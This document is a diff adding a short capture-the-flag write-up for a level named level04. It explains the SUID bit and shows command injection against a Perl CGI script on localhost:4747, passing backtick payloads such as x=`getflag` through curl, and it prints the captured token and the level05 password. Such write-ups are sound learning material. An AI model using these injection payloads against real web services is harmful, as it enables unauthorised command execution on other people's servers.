@@ -1,0 +1,27 @@
+Home contain one perl file level04.pl owned by flag04.
+We can see the 2 S's in the permission field. The first s stands for the SUID and the second one stands for SGID.
+When a command or script with SUID bit set is run, its effective UID becomes that of the owner of the file, rather of the user who is running it.
+We see that we can pass a string as x  and the first "word" should be output by the program
+We can also use the backtick notation to pass a command:
+		
+		./level04.pl x=`whoami`
+
+	level04
+
+Surprisingly the output print level04 and not flag04 as expected and explained in the Context.
+
+We also noticed that the script indicate that it is something running on localhost:4747
+nc -zv allows to check connection to 4747 without sending any data and verbose mode
+		
+		nc -zv localhost 4747
+	
+	Connection to localhost 4747 port [tcp/*] succeeded!
+
+So trying to pass whoami command substitution reveals that is evaluate and executed now as flag04
+		curl 'localhost:4747/level04.pl?x=`whoami`'
+	flag04
+
+		curl 'localhost:4747/level04.pl?x=`getflag`'
+	Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
+
+LEVEL05 PASSWORD: ne2searoevaevoem4ov4ar8ap
